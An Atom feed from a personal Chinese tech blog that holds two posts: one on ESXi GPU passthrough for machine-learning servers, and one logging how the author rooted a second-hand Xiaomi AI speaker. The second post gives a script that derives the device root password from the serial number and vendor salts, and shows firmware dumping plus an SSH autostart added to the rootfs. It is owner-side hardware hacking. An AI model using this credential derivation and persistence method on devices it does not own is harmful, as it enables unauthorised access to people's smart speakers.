<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>badb100d&#39;s blog</title>
  
  <subtitle>neurolagger</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://badb100d.com/"/>
  <updated>2021-01-04T12:36:35.000Z</updated>
  <id>https://badb100d.com/</id>
  
  <author>
    <name>badb100d</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vmware ESXi 显卡直通 &amp; Tesla V100 显卡支持环境配置</title>
    <link href="https://badb100d.com/2021/01/04/2021-01-04/"/>
    <id>https://badb100d.com/2021/01/04/2021-01-04/</id>
    <published>2021-01-04T12:35:33.000Z</published>
    <updated>2021-01-04T12:36:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近因为一些原因，对公司的机器学习服务器进行了重装，为了减少以后肉身去运维的次数，同时增加服务器的可扩展性，直接在物理机上装上了 ESXi。同时部署内部虚拟网络，增加透明代理。物理机上有4块 2080Ti 和2块 Tesla V100 显卡，通过 ESXi 的显卡直通，直接将 PCIe 设备添加进机器学习所用的虚拟机（看了下  NVIDIA Grid vGPU 的方案坑更多，遂放弃）。这里将这个过程中遇到的坑记录一下。</p><a id="more"></a><h2 id="GPU-Server-安装"><a href="#GPU-Server-安装" class="headerlink" title="GPU Server 安装"></a>GPU Server 安装</h2><h3 id="1-物理机-BIOS-开启扩展寻址"><a href="#1-物理机-BIOS-开启扩展寻址" class="headerlink" title="1. 物理机 BIOS 开启扩展寻址"></a>1. 物理机 BIOS 开启扩展寻址</h3><p>因为我这里的 V100 显卡单块显存有32GB，结合 nvidia 和 vmware 的相关文档，需要开启 BIOS 的高位宽寻址选项，可参考下图设置</p><img src="/2021/01/04/2021-01-04/bios-mmio.jpg" class=""><h3 id="2-安装-ESXi-6-7-U3-updates"><a href="#2-安装-ESXi-6-7-U3-updates" class="headerlink" title="2. 安装 ESXi 6.7 U3 + updates"></a>2. 安装 ESXi 6.7 U3 + updates</h3><p>安装过程比较简单，默认安装即可，这里不做记录。因为之前遇到过 web UI 无法登陆的问题，为了保证不用去物理操作机器，安装完 ESXi 后在管理页面里开启 ssh，在<code>/etc/ssh/keys-root/authorized_keys</code>中添加 ssh 密钥并配置文件权限，更改 sshd 配置中的两条，禁用密码登录。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost:~] cat /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> ......</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 以下两条为修改/新增内容，其他内容不变</span></span><br><span class="line">PasswordAuthentication no</span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"><span class="meta">#</span><span class="bash"> ......</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>重启 ssh 服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost:~] /etc/init.d/SSH restart</span><br></pre></td></tr></table></figure><h3 id="3-配置-ESXi-显卡直通"><a href="#3-配置-ESXi-显卡直通" class="headerlink" title="3. 配置 ESXi 显卡直通"></a>3. 配置 ESXi 显卡直通</h3><p>硬件直通的原理示意图大致如下</p><img src="/2021/01/04/2021-01-04/esxi-passthru.png" class=""><p>在管理选项卡的硬件里，过滤出 NVIDIA 设备，并选定相关设备，切换直通属性。</p><img src="/2021/01/04/2021-01-04/nvidia-pcie.jpg" class=""><h3 id="4-创建虚拟机，将显卡添加至虚拟机设备"><a href="#4-创建虚拟机，将显卡添加至虚拟机设备" class="headerlink" title="4. 创建虚拟机，将显卡添加至虚拟机设备"></a>4. 创建虚拟机，将显卡添加至虚拟机设备</h3><p>首先按正常流程新建一个虚拟机 (兼容性选择 ESXi 6.7虚拟机 就可以)。因为有显卡直通，内存必须配置成预留所有。在虚拟机的虚拟硬件中，逐一添加显卡设备</p><img src="/2021/01/04/2021-01-04/vm-add-pcie.png" class=""><p>添加的过程发现，同一台虚拟机不能直通太多的 PCIe 设备，但 2080Ti 显卡如果只直通一个主设备的话，虚拟机会出错。</p><p>经过多次试验，发现 2080Ti 设备只添加主设备和第二个设备 (USB 3.1 Host Controller) 时，机器运转正常。这样加上两张 V100，总共10个 PCIe 直通设备添加到虚拟机。</p><img src="/2021/01/04/2021-01-04/vm-pcie-list.jpg" class=""><h3 id="5-额外的虚拟机参数配置"><a href="#5-额外的虚拟机参数配置" class="headerlink" title="5. 额外的虚拟机参数配置"></a>5. 额外的虚拟机参数配置</h3><p>在虚拟机设置中，添加或修改一些启动变量，配置路径如下图</p><img src="/2021/01/04/2021-01-04/boot-para.jpg" class=""><p>分别添加以下参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 让N卡认为设备不在虚拟环境中</span></span><br><span class="line">hypervisor.cpuid.v0 = FALSE</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开 64bit 位宽寻址，如果没开这个将识别不到 V100 显卡</span></span><br><span class="line">pciPassthru.use64bitMMIO = TRUE</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置 MMIO 内存大小（这里必须为2的整数次幂 power-of-two)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 参考 https://kb.vmware.com/s/article/2142307 &amp; https://blogs.vmware.com/apps/2018/09/using-gpus-with-virtual-machines-on-vsphere-part-2-vmdirectpath-i-o.html ）</span></span><br><span class="line">pciPassthru.64bitMMIOSizeGB = 128</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> vGPU 支持，看起来是对 Grid 的配置，加上也不影响，参考https://docs.nvidia.com/grid/4.7/grid-vgpu-release-notes-vmware-vsphere/index.html</span></span><br><span class="line">pciPassthru0.cfg.enable_large_sys_mem = 1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置模式为 IOAPIC，参考 https://www.vmware.com/pdf/vsp_4_vmdirectpath_host.pdf</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 多次查看启动日志，发现这里得把所有直通显卡设备都关了才行</span></span><br><span class="line">pciPassthru0.msiEnabled = FALSE</span><br><span class="line">pciPassthru1.msiEnabled = FALSE</span><br><span class="line">pciPassthru2.msiEnabled = FALSE</span><br><span class="line">pciPassthru3.msiEnabled = FALSE</span><br><span class="line">pciPassthru4.msiEnabled = FALSE</span><br><span class="line">pciPassthru5.msiEnabled = FALSE</span><br><span class="line">pciPassthru6.msiEnabled = FALSE</span><br><span class="line">pciPassthru7.msiEnabled = FALSE</span><br><span class="line">pciPassthru8.msiEnabled = FALSE</span><br><span class="line">pciPassthru9.msiEnabled = FALSE</span><br></pre></td></tr></table></figure><p>配置完成后，可以尝试挂载 iso 进行系统安装，如果虚拟机启动不成功，可以 ssh 上去在虚拟机目录下 <code>tail -F vmware.log</code>看看哪里出错了，直通设备多启动会比较慢。</p><h3 id="6-系统问题"><a href="#6-系统问题" class="headerlink" title="6. 系统问题"></a>6. 系统问题</h3><p>我安装的是 ubuntu 桌面版，安装过程按照正常流程即可，安装完成后可能有以下问题。</p><h4 id="intel-microcode"><a href="#intel-microcode" class="headerlink" title="intel-microcode"></a>intel-microcode</h4><p>有一个 <code>intel-microcode</code> 软件包的更新，会导致系统重启后卡在黑屏。直接卸载这个软件貌似也没啥影响。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@gpu-ubuntu:~# apt-get --purge remove intel-microcode</span><br></pre></td></tr></table></figure><h4 id="nouveau"><a href="#nouveau" class="headerlink" title="nouveau"></a>nouveau</h4><p>vmware 的虚拟硬件默认会有一个显卡，会导致系统加载一个 nouveau.ko 的显卡驱动，这个驱动与 nvidia 驱动冲突。</p><p>通过将 nouveau.ko 加入黑名单，禁用其加载。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@gpu-ubuntu:~# cat &lt;&lt;EOF &gt;&gt; /etc/modprobe.d/blacklist-nouveau.conf</span><br><span class="line"></span><br><span class="line">blacklist nouveau</span><br><span class="line">options nouveau modeset=0</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">root@gpu-ubuntu:~# update-initramfs -u</span><br><span class="line">root@gpu-ubuntu:~# shutdown -r 0             # 重启生效</span><br></pre></td></tr></table></figure><h3 id="7-待解决问题"><a href="#7-待解决问题" class="headerlink" title="7. 待解决问题"></a>7. 待解决问题</h3><p>N卡驱动安装完之后基本就可以用了，设备列表如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@gpu-ubuntu18:~# nvidia-smi</span><br><span class="line">Mon Jan  4 20:17:48 2021</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| NVIDIA-SMI 450.80.02    Driver Version: 450.80.02    CUDA Version: 11.0     |</span><br><span class="line">|-------------------------------+----------------------+----------------------+</span><br><span class="line">| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |</span><br><span class="line">| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |</span><br><span class="line">|                               |                      |               MIG M. |</span><br><span class="line">|===============================+======================+======================|</span><br><span class="line">|   0  Tesla V100-PCIE...  Off  | 00000000:03:00.0 Off |                    0 |</span><br><span class="line">| N/A   36C    P0    27W / 250W |      0MiB / 32510MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   1  GeForce RTX 208...  Off  | 00000000:04:00.0 Off |                  N/A |</span><br><span class="line">| 27%   29C    P8    15W / 250W |      0MiB / 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   2  GeForce RTX 208...  Off  | 00000000:05:00.0 Off |                  N/A |</span><br><span class="line">| 27%   29C    P8    15W / 250W |      0MiB / 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   3  Tesla V100-PCIE...  Off  | 00000000:0B:00.0 Off |                    0 |</span><br><span class="line">| N/A   35C    P0    25W / 250W |      0MiB / 32510MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   4  GeForce RTX 208...  Off  | 00000000:13:00.0 Off |                  N/A |</span><br><span class="line">| 27%   28C    P8     3W / 250W |      0MiB / 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   5  GeForce RTX 208...  Off  | 00000000:14:00.0 Off |                  N/A |</span><br><span class="line">| 27%   27C    P8     1W / 250W |      0MiB / 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line"></span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| Processes:                                                                  |</span><br><span class="line">|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |</span><br><span class="line">|        ID   ID                                                   Usage      |</span><br><span class="line">|=============================================================================|</span><br><span class="line">|  No running processes found                                                 |</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>ESXi 里的 PCIe 设备顺序和这里的对应关系没搞明白，试了好几次都没有把 V100 调整到前面，根据网上的一些资料，目前来看此问题暂时无解。</p><h2 id="网络划分"><a href="#网络划分" class="headerlink" title="网络划分"></a>网络划分</h2><p>在 ESXi 里增加了一个 OpenWrt 网关作为 GPU Server 的上级路由，参考<span class="exturl" data-url="aHR0cHM6Ly9mb29sZW5nLmNvbS8yMDIwLzAzLzEwL3Ztd2FyZS1lc3hpLXNpbmdsZV9pcF9mb3JfbmF0Lw==" title="https://fooleng.com/2020/03/10/vmware-esxi-single_ip_for_nat/">“VMWARE ESXI 使用单个外网IP地址实现NAT”<i class="fa fa-external-link"></i></span>这篇文章，使用除原 manage network 之外额外的 IP 进行常规网络访问（双 IP 一个给路由 WAN，一个给 manage）</p><p>类似下图结构。</p><img src="/2021/01/04/2021-01-04/vm-lan.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近因为一些原因，对公司的机器学习服务器进行了重装，为了减少以后肉身去运维的次数，同时增加服务器的可扩展性，直接在物理机上装上了 ESXi。同时部署内部虚拟网络，增加透明代理。物理机上有4块 2080Ti 和2块 Tesla V100 显卡，通过 ESXi 的显卡直通，直接将 PCIe 设备添加进机器学习所用的虚拟机（看了下  NVIDIA Grid vGPU 的方案坑更多，遂放弃）。这里将这个过程中遇到的坑记录一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="linux" scheme="https://badb100d.com/tags/linux/"/>
    
      <category term="vmware" scheme="https://badb100d.com/tags/vmware/"/>
    
      <category term="ESXi" scheme="https://badb100d.com/tags/ESXi/"/>
    
      <category term="environment" scheme="https://badb100d.com/tags/environment/"/>
    
      <category term="nvidia" scheme="https://badb100d.com/tags/nvidia/"/>
    
      <category term="deeplearning" scheme="https://badb100d.com/tags/deeplearning/"/>
    
  </entry>
  
  <entry>
    <title>小米AI音箱(小爱同学)root记录</title>
    <link href="https://badb100d.com/2020/12/01/2020-12-01/"/>
    <id>https://badb100d.com/2020/12/01/2020-12-01/</id>
    <published>2020-12-01T11:28:50.000Z</published>
    <updated>2020-12-01T11:28:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近计划搞一搞智能音箱，从网上买了一个二手的小米AI音箱（型号MDZ-25-DA）</p><img src="/2020/12/01/2020-12-01/xiaomi-ai.jpg" class=""><p>拆开看是绿板主板，应该是偏新的批次，主板外观如下图：</p><img src="/2020/12/01/2020-12-01/green-board.jpg" class=""><p>参考<span class="exturl" data-url="aHR0cHM6Ly9iYnMuaGFzc2JpYW4uY29tL2ZvcnVtLnBocD9tb2Q9dmlld3RocmVhZCZ0aWQ9ODc1NCZwYWdlPTE=" title="https://bbs.hassbian.com/forum.php?mod=viewthread&tid=8754&page=1">hassbian<i class="fa fa-external-link"></i></span>的方法对设备进行root，记录一下。</p><h3 id="1-拆机串口登录"><a href="#1-拆机串口登录" class="headerlink" title="1. 拆机串口登录"></a>1. 拆机串口登录</h3><p>从网上找了几个拆解图，基本知道螺丝位置后，正常进行拆解就行。调试串口为间距 1mm 的 3pin 口，淘宝买了根 SH 1.0mm 3pin 线，再焊接3根杜邦线接到 USB2TTL 设备上，波特率 115200 进入 tty，输入任意键，弹出 root 登录提示。</p><p>这个 root 密码和 kindle 的 root 密码挺像的，根据串号加固定字符串算出来的，有点HMAC的意思。</p><p>网上查找了一些资料，找到几个字符串，经过测试我的设备对应字符串是<code>B0168A6D-119A-F21A-DA58-980732F80A19</code>。</p><p>大致算法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2.7</span></span><br><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通用说明：</span></span><br><span class="line"><span class="comment"># 1、先找到小爱音响SN码，通常在拆开后的底座里面。</span></span><br><span class="line"><span class="comment"># 例如：SN：20190/122119360</span></span><br><span class="line"><span class="comment"># 2、root登录密码=md5(SN+通配字符串)取值的前14位</span></span><br><span class="line"><span class="comment"># 通配字符串：9C78089F-83C7-3CDC-BCC9-93B378868E7F</span></span><br><span class="line"><span class="comment"># 即：20190/1221193609C78089F-83C7-3CDC-BCC9-93B378868E7F</span></span><br><span class="line"><span class="comment"># 3、使用MD5在线加密工具 https://md5jiami.51240.com/</span></span><br><span class="line"><span class="comment"># 4、将2中的最终待加密代码经md5加密后得到如下32位小写加密信息：（只看32位，且一定小写）</span></span><br><span class="line"><span class="comment"># 865027665beacb8f8240355d7300e0ac</span></span><br><span class="line"><span class="comment"># 取前14位：865027665beacb 即为root登陆密码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">MAGIC_SALTS = [\</span><br><span class="line">               <span class="string">&quot;5775B10D-15C0-7827-97B9-88EA07FCA97A&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;0168A6D-119A-F21A-DA58-980732F80A19&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;A20EDC68-62E5-70C6-76E8-75879721B8EC&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;B0168A6D-119A-F21A-DA58-980732F80A19&quot;</span>,\</span><br><span class="line">              ]</span><br><span class="line">sn = <span class="string">&quot;1****/9********&quot;</span></span><br><span class="line">root_password = md5( sn + MAGIC_SALTS[<span class="number">3</span>] ).lower()[:<span class="number">14</span>]</span><br><span class="line"><span class="built_in">print</span> root_password</span><br></pre></td></tr></table></figure><h3 id="2-临时打开ssh"><a href="#2-临时打开ssh" class="headerlink" title="2. 临时打开ssh"></a>2. 临时打开ssh</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@S12A:~# dropbearkey -t rsa -f /data/dropbear_rsa_host_key</span><br><span class="line">root@S12A:~# dropbear -r /data/dropbear_rsa_host_key</span><br><span class="line">root@S12A:~# ifconfig</span><br></pre></td></tr></table></figure><p>然后通过 ssh 连入设备，界面上会比USB2TTL的CUI更完善一些。</p><h3 id="3-提取文件系统"><a href="#3-提取文件系统" class="headerlink" title="3. 提取文件系统"></a>3. 提取文件系统</h3><p><code>mount</code>看一下目前挂载的分区，另外可以<code>ls -alF /dev/mtd*</code>看看还有哪些其他分区，绿板小爱同学有a/b分区备份，建议先刷1个分区，如果能够正常启动的话，再把另一个分区刷了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@S12A:~# mount</span><br><span class="line">/dev/mtdblock4 on / type squashfs (ro,noatime)</span><br><span class="line">proc on /proc type proc (rw,nosuid,nodev,noexec,noatime)</span><br><span class="line">sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,noatime)</span><br><span class="line">tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noatime)</span><br><span class="line">tmpfs on /dev type tmpfs (rw,nosuid,relatime,size=512k,mode=755)</span><br><span class="line">devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,mode=600,ptmxmode=000)</span><br><span class="line">debugfs on /sys/kernel/debug type debugfs (rw,noatime)</span><br><span class="line">pstore on /sys/fs/pstore type pstore (rw,relatime)</span><br><span class="line">/dev/ubi0_0 on /data type ubifs (rw,relatime)</span><br><span class="line">/dev/ubi0_0 on /etc/shadow type ubifs (rw,relatime)</span><br><span class="line">root@S12A:~# ll /dev/mtd*</span><br><span class="line">crw-------    1 root     root       90,   0 Jan  1  2015 /dev/mtd0</span><br><span class="line">crw-------    1 root     root       90,   1 Jan  1  2015 /dev/mtd0ro</span><br><span class="line">crw-------    1 root     root       90,   2 Jan  1  2015 /dev/mtd1</span><br><span class="line">crw-------    1 root     root       90,   3 Jan  1  2015 /dev/mtd1ro</span><br><span class="line">crw-------    1 root     root       90,   4 Jan  1  2015 /dev/mtd2</span><br><span class="line">crw-------    1 root     root       90,   5 Jan  1  2015 /dev/mtd2ro</span><br><span class="line">crw-------    1 root     root       90,   6 Jan  1  2015 /dev/mtd3</span><br><span class="line">crw-------    1 root     root       90,   7 Jan  1  2015 /dev/mtd3ro</span><br><span class="line">crw-------    1 root     root       90,   8 Jan  1  2015 /dev/mtd4</span><br><span class="line">crw-------    1 root     root       90,   9 Jan  1  2015 /dev/mtd4ro</span><br><span class="line">crw-------    1 root     root       90,  10 Jan  1  2015 /dev/mtd5</span><br><span class="line">crw-------    1 root     root       90,  11 Jan  1  2015 /dev/mtd5ro</span><br><span class="line">crw-------    1 root     root       90,  12 Jan  1  2015 /dev/mtd6</span><br><span class="line">crw-------    1 root     root       90,  13 Jan  1  2015 /dev/mtd6ro</span><br><span class="line">brw-------    1 root     root       31,   0 Jan  1  2015 /dev/mtdblock0</span><br><span class="line">brw-------    1 root     root       31,   1 Jan  1  2015 /dev/mtdblock1</span><br><span class="line">brw-------    1 root     root       31,   2 Jan  1  2015 /dev/mtdblock2</span><br><span class="line">brw-------    1 root     root       31,   3 Jan  1  2015 /dev/mtdblock3</span><br><span class="line">brw-------    1 root     root       31,   4 Jan  1  2015 /dev/mtdblock4</span><br><span class="line">brw-------    1 root     root       31,   5 Jan  1  2015 /dev/mtdblock5</span><br><span class="line">brw-------    1 root     root       31,   6 Jan  1  2015 /dev/mtdblock6</span><br></pre></td></tr></table></figure><p>切到/tmp临时目录，对系统镜像进行提取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@S12A:~# cd /tmp</span><br><span class="line">root@S12A:/tmp# dd if=/dev/mtdblock4 of=/tmp/m4.img</span><br><span class="line">65536+0 records in</span><br><span class="line">65536+0 records out</span><br></pre></td></tr></table></figure><p>scp 把 m4.img 复制到另一台 Linux 机器，再回来把 /tmp/m4.img 删除，重新 dd mtdblock5 出来做个b分区备份。</p><h3 id="4-解压并修改分区"><a href="#4-解压并修改分区" class="headerlink" title="4. 解压并修改分区"></a>4. 解压并修改分区</h3><h4 id="4-1-解压分区"><a href="#4-1-解压分区" class="headerlink" title="4.1 解压分区"></a>4.1 解压分区</h4><p>在 Linux 机器上解压提取到的 m4.img 镜像，查看 block size，后面重新压缩会用到。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/test/Desktop/xiaomi# unsquashfs -s mtdblock4.img</span><br><span class="line">Found a valid SQUASHFS 4:0 superblock on mtdblock4.img.</span><br><span class="line">Creation or last append time Thu Jul 16 13:04:11 2020</span><br><span class="line">Filesystem size 32052.31 Kbytes (31.30 Mbytes)</span><br><span class="line">Compression xz</span><br><span class="line">xz: error reading stored compressor options from filesystem!</span><br><span class="line">Block size 131072</span><br><span class="line">Filesystem is exportable via NFS</span><br><span class="line">Inodes are compressed</span><br><span class="line">Data is compressed</span><br><span class="line">Fragments are compressed</span><br><span class="line">Always-use-fragments option is not specified</span><br><span class="line">Xattrs are not stored</span><br><span class="line">Duplicates are removed</span><br><span class="line">Number of fragments 106</span><br><span class="line">Number of inodes 1763</span><br><span class="line">Number of ids 1</span><br></pre></td></tr></table></figure><p>解压镜像，<strong>注意这里需要用 root 解压，非 root 账户可能无法创建设备文件等特殊文件，重新打包刷入后，系统会起不来</strong>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/test/Desktop/xiaomi# unsquashfs -dest m4 mtdblock4.img</span><br><span class="line">Parallel unsquashfs: Using 4 processors</span><br><span class="line">1661 inodes (2074 blocks) to write</span><br><span class="line"></span><br><span class="line">[======================================================/] 2074/2074 100%</span><br><span class="line"></span><br><span class="line">created 1082 files</span><br><span class="line">created 102 directories</span><br><span class="line">created 578 symlinks</span><br><span class="line">created 1 devices</span><br><span class="line">created 0 fifos</span><br></pre></td></tr></table></figure><h4 id="4-2-添加自启动项"><a href="#4-2-添加自启动项" class="headerlink" title="4.2 添加自启动项"></a>4.2 添加自启动项</h4><p>修改 /etc/rc.local 添加 /data/init.sh（或者把自启动的命令都写入rc.local也行，反正镜像都改写了），改完的文件如下：</p><h5 id="rc-local"><a href="#rc-local" class="headerlink" title="rc.local"></a>rc.local</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/test/Desktop/xiaomi# cat m4/etc/rc.local</span><br><span class="line"><span class="meta">#</span><span class="bash"> the system init finished. By default this file does nothing.</span></span><br><span class="line">sh /data/init.sh &amp;</span><br><span class="line">exit 0</span><br><span class="line">root@ubuntu:/home/test/Desktop/xiaomi#</span><br></pre></td></tr></table></figure><h5 id="data-init-sh"><a href="#data-init-sh" class="headerlink" title="/data/init.sh"></a>/data/init.sh</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@S12A:~# chmod +x /data/init.sh# 添加可执行属性</span><br><span class="line">root@S12A:~# ll /data/init.sh</span><br><span class="line">-rwxr-xr-x    1 root     root           188 Dec 24  2019 /data/init.sh*</span><br><span class="line">root@S12A:~# cat /data/init.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">if [ -e /data/dropbear_rsa_host_key ]</span><br><span class="line">then</span><br><span class="line">  echo &quot;exists&quot;</span><br><span class="line">else</span><br><span class="line">  echo &quot;not exist&quot;</span><br><span class="line">  dropbearkey -t rsa -f /data/dropbear_rsa_host_key</span><br><span class="line">fi</span><br><span class="line">dropbear -r /data/dropbear_rsa_host_key</span><br></pre></td></tr></table></figure><h4 id="4-3-写入-ssh-密钥"><a href="#4-3-写入-ssh-密钥" class="headerlink" title="4.3 写入 ssh 密钥"></a>4.3 写入 ssh 密钥</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@S12:~# cat /etc/dropbear/authorized_keys</span><br><span class="line">ssh-rsa AAA**************************************************</span><br></pre></td></tr></table></figure><h4 